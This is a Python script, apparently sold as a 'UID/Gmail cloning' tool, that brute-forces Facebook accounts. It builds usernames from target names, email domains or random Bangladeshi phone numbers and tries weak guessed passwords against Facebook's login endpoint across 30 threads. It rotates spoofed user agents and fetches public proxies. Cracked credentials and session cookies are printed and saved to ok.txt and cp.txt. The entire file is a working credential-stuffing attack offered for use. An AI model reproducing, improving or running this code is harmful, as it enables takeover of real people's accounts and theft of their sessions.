#................♥NEHAL AHMED♥................
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

import getpass
attemps = 0
while attemps <12345677901:

	password = input (' \n\033[1;37m[+]\033[1;33m Enter Password : ')
	if  password == '8888':
		print (' \033[1;92m[💛]You have a successfully login! ')
		break
	else:
		print ('\n\033[1;37m[!]\033[1;31m Invalid Password! \033[1;37mTry again... \n\n\033[1;37m*\033[1;92mThis Tools is Paid. Contact Owner to Buy this Tools. \n Whatsapp +8801613016943')
		attemps += 1
		continue
		os.system('clear')


logo = ("""
\033[1;37m d8b   db d88888b db   db  .d8b.  db      
\033[1;37m 888o  88 88'     88   88 d8' `8b 88      
\033[1;37m 88V8o 88 88ooooo 88ooo88 88ooo88 88      
\033[1;37m 88 V8o88 88~~~~~ 88~~~88 88~~~88 88      
\033[1;37m 88  V888 88.     88   88 88   88 88booo. 
\033[1;37m VP   V8P Y88888P YP   YP YP   YP Y88888P

 \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;37m[\033[1;37m✔\033[1;37m] AUTHOR    \033[1;37m: \033[1;37mNEHAL AHMED           
 \033[1;37m[\033[1;37m✔\033[1;37m] FACEBOOK  \033[1;37m: \033[1;37mnehal.ahmed6             
 \033[1;37m[\033[1;37m✔\033[1;37m] WHATSAPP  \033[1;37m: \033[1;37m+8801613016943                     
 \033[1;37m[\033[1;37m✔\033[1;37m] GITHUB    \033[1;37m: \033[1;37mweirdnehal                
 \033[1;37m[\033[1;37m✔\033[1;37m] TOOLS     \033[1;37m: \033[1;37mUID/GMAIL CLONING                        
 \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")


class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        os.system('xdg-open https://www.facebook.com/nehal.ahmed6')
        print(logo)
        print(" [1] Facebook Email Cloning")
        print(" [2] Facebook Username Cloning")
        print(" [3] Facebook Random Cloning [\033[1;35mBANGLADESH]")
        print(" [0] Exit")
        Snigdho =input(" [√] Choose : ")
        if Snigdho in ["1", "01"]:
            v1()
        if Snigdho in ["2", "02"]:
            v2()
        if Snigdho in ["3","03"]:
            v3()
        if Snigdho in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/nehal.ahmed6')
    kode = input('  Target fast name : ')
    kodex = input('  Target last name :  ')
    print('  Example Doamin : @gmail.com, @yahoo.com ')
    doamin = input('  Input Doamin  : ')
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [+]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [+]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[+]  The process has been started')
        print(' [!]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v2():
    user=[]
    os.system('clear')
    os.system('xdg-open https://github.com/weirdnehal')
    print(logo)
    kode = input('  Target fast name : ')
    kodex = input('  Target last name :  ')
    doamin = '.'
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [+]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [+]  Target Doamin:\033[1;92m Facebook Cloning (name)")
        print(' \033[1;97m[+]  The process has been started')
        print(' [!]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def v3():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/nehal.ahmed6')
    print(logo)
    kode = input('  Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook Cloning (BD number) '
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        os.system('xdg-open https://github.com/weirdnehal')
        print(logo)
        tl = str(len(user))
        print(' [+]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [+]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[+]  The process has been started')
        print(' [!]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mNEHAL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'path':'/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=hvvxY_hJhY1DbD3I_WQfeRLj; sb=h_vxYz7vCDIyiGLBzokl0PbZ; rbyWTlcXI=eyJ1YUluZm8iOnsidXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV09XNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjU0MTAuMTQ0IFNhZmFyaS81MzcuMzYiLCJlbmdpbmUiOiJibGluayIsIm9zVHlwZSI6IndpbmRvd3MiLCJicm93c2VyIjoiY2hyb21lIiwiYnJvd3NlclZlcnNpb24iOnsibWFqb3IiOjExMCwiZnVsbCI6IjExMC4wLjU0MTAuMTQ0In19fQ--',
            'referer': 'https://mbasic.facebook.com/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[NEHAL-OK💛] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                print(f" \n ══════════════════════════════════════════")
                open('/sdcard/NEHAL/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[NEHAL-CP🔒] {uid}|{ps}")
                open('/sdcard/NEHAL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[NEHAL💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
